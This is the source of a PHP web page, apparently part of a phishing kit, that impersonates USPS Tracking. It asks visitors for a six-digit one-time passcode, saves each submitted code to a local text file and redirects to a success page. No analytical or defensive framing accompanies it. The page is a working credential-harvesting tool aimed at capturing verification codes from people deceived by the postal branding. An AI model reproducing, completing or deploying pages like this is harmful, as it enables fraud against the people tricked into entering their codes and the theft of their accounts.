...
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    ...
    if (empty($errors)) {
        ...
        if (saveUserData('otp_verification.txt', $data)) {
            // Redirect to success page
            header('Location: success.php');
            exit;
        } else {
            $errors['form'] = 'There was an error verifying your OTP. Please try again.';
        }
    }
}
?>
...
<head>
    ...
    <title>USPS Tracking - OTP Verification</title>
...
<body class="font-['HelveticaNeueW02-55Roma','Helvetica Neue',Helvetica,Arial,sans-serif] text-[#23285a]">
        ...
        <main class="flex-1 w-full">
            ...
            <div class="w-full max-w-[960px] mx-auto px-4 sm:px-6 pb-16">
                <div class="mt-12 space-y-12">
                    ...
                    <!-- OTP Form -->
                    <section>
                        <div class="text-[17px] font-semibold text-[#23285a] mb-1">Enter OTP Code</div>
                        ...
                        <?php endif; ?>
                        <form method="POST" action="" class="max-w-[400px] mx-auto">
                            <div class="mb-6">
                                <input type="text" inputmode="numeric" name="otp" placeholder="Enter 6-digit OTP" class="w-full border border-[#3d4095] rounded-sm px-4 py-3 text-[16px] text-[#1a2252] placeholder:text-[#757cab] bg-white focus:outline-none focus:ring-1 focus:ring-[#2b2a72]/40 focus:border-[#2b2a72] text-center font-mono tracking-widest" maxlength="6" pattern="^\d{6}$" value="<?php echo htmlspecialchars($_POST['otp'] ?? ''); ?>" required />
                                <?php if (isset($errors['otp'])): ?>
                                    <p class="mt-1 text-xs text-red-600 text-center"><?php echo htmlspecialchars($errors['otp']); ?></p>
                                <?php endif; ?>
                            </div>
                            <button type="submit" class="w-full inline-flex items-center justify-center bg-[#2b2a72] text-white font-semibold px-12 py-3.5 text-[16px] tracking-wide rounded-sm hover:bg-[#211f5a] transition-colors">
                                Verify OTP
                            </button>
                            <p class="mt-4 text-center text-[12px] text-[#4a4f6d]">
                                Didn't receive the code? <a href="#" class="text-[#2b2a72] hover:underline">Resend OTP</a>
                            </p>
                        </form>
                    </section>
                </div>
    ...
    <script>
        ...
        document.querySelector('input[name="otp"]').addEventListener('input', function(e) {
            ...
            if (errorElement) {
                errorElement.textContent = (value.length > 0 && value.length < 6) ? 'OTP must be 6 digits' : '';
            }
        });
        
        // Add input focus styling
        document.querySelector('input[name="otp"]').addEventListener('focus', function(e) {
            e.target.select();
        });
    </script>
</body>
